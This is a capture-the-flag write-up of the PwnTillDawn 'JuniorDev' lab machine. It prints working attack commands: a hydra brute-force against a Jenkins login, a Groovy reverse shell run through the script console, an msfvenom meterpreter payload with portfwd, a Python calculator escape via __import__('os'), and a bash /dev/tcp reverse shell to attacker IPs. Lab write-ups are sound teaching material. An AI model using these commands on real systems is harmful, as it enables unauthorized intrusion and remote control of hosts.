---
title: JuniorDev Writeup PwnTillDawn
author: r0b0tG4nG
date: 2021-11-27 11:33:00 +0800
categories: [Blogging, PwnTillDawn]
tags: [writeups, jenkins, portfwd, python]
math: true
mermaid: true
image:
  src: ![image](https://user-images.githubusercontent.com/67085453/143765869-f4b70e8d-17d3-4e92-9311-e28dd167b4c9.png)
  width: 800
  height: 500
---

![image](https://user-images.githubusercontent.com/67085453/143765891-34e88ab8-1881-47a1-90de-e588c3eea925.png)<br>

**> Information Gathering**<br>
Started with the usual nmap scan and from the scan we can see active ports. port 22 (ssh) & port 30609 (jetty 9.4.27).<br>
![image](https://user-images.githubusercontent.com/67085453/143765662-e120b52a-a05e-4665-b2a1-55e4dacfe4d9.png)

<br>
Upon visiting the web service running on port _30609_, i found a login screen.<br>
![image](https://user-images.githubusercontent.com/67085453/143765631-f7e788fc-8e83-4b1c-a97b-a639e13632de.png)<br>


Since we dont have any credentials, the best option is to *bruteforce* the target web login. Below is the hydra command used<br>
`hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.150.150.38 -s 30609 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password"`<br>
![image](https://user-images.githubusercontent.com/67085453/143765717-ed681b4b-3abe-43cb-b3c7-609f419e7275.png)<br>

Hydra yield positive results. We have found the password for the admin user. The next step is to login on jetty webapp running on port 30609. *username == admin* & *password == matrix*<br>
![image](https://user-images.githubusercontent.com/67085453/143765743-22635b7b-a430-4f4a-889a-454bde37f372.png)<br>
     

The credentials worked we are logged in now.<br>
![image](https://user-images.githubusercontent.com/67085453/143765751-202149be-2d13-4ce7-b865-b7b839156884.png)<br>

After a short googling on how to abuse jenkins script console to rce we found a good post from <a href="https://github.com/gquere/pwn_jenkins">gquere</a>. With this information, we were able to build a script to test remote code execution on the target. <br>
![image](https://user-images.githubusercontent.com/67085453/143765761-0e7da699-8773-49fa-8df6-e511967f33a7.png)<br>


Now  that we can execute commands on the target, its time to spawn a reverse shell. Below is the script I used.
```shell
String host="10.66.67.114";  
int port=9001;  
String cmd="/bin/bash";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
<br>
![image](https://user-images.githubusercontent.com/67085453/143765793-ff14889e-8cdb-4b2b-b144-003ab641c429.png) <br>


**> Post Exploitation**<br>
After i got a shell, post enumeration phase begins. I transfered linpeas to the target, changer permissions and executed linpeas. In linpeas output, i found a port binded to the _loopback address(127.0.0.1:8080)_.<br>
![image](https://user-images.githubusercontent.com/67085453/143765907-412f03af-7170-4dc5-b840-ee0835a53718.png)<br> 

Port 8080 is mostly used for web services. To confirm, i tried `wget` on the ort since `curl` is not found on the target.<br>
![image](https://user-images.githubusercontent.com/67085453/143765930-93ced860-08cc-4b92-827d-24a5ff158593.png)<br>

Reading the fetched `index.html` from port 8080 indicates that there is a web webapp running internally.<br>
![image](https://user-images.githubusercontent.com/67085453/143765946-d1c2a430-0af0-49ab-b1fd-83f18ddc019c.png)<br>

To access this internal web service, we have to port-forward port 8080 from the target to our attacking machine. To do this, i created a linux payload using `msfvenom`. <br>
``msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.66.66.78 LPORT=9002 -f elf -o 9002msf``<br>
![image](https://user-images.githubusercontent.com/67085453/143765952-d511e7e9-e049-4a7a-9360-38e69b2548d4.png)<br>

The next thing to do is to transfer the payload to the target and execute it while msfconsole is listerning fortrt incoming connections.<br>
![image](https://user-images.githubusercontent.com/67085453/143765957-aa29bf3e-872b-4760-b63b-ffedb1e21e22.png)<br>

When the payload is executed on the target, we should recieve a connection back on `msfconsole`. Once the connection is in, we can port-forward the target intertnal port `8080` to our attacking machine using the `portfwd`command in msfconsole<br>
`portfwd add -l 8080 -p 8080 -r 127.0.0.1`<br>
![image](https://user-images.githubusercontent.com/67085453/143765963-00518744-c295-44f9-820a-9db9a7dcfcbf.png)<br>

Now that we the target port `8080` connected back to our attacking machine, wehn visited, we found a python maths console.<br>
![image](https://user-images.githubusercontent.com/67085453/143765968-cf05e59b-727e-4377-ac76-ba25ed07ce10.png)<br>

Since it's a simple python maths calculator, we can easily bypasss the pythin functions and gain a remote code execution. To do this, we will use `__import__("os").system("")`<br>

We created a bash file with contains our bash reverse liner. a simple bash script, transfered the bash file to the target. 
```shell
#!/bin/bash
bash -c  'bash -i>&/dev/tcp/10.66.66.78/9002 0>&1'
```
<br>

Once our bash file is on the target, we can execute the bash file using the pythin calculator. We simply do this using the command
`__import__("os").system("/bin/bash /tmp/shell.sh")`<br>
![image](https://user-images.githubusercontent.com/67085453/143765976-251cd43b-7e6d-4852-895b-6b2ba81033c9.png)<br><br>


Referrence: <a href="https://online.pwntilldawn.com/">PwnTillDawn Online battlefield</a>
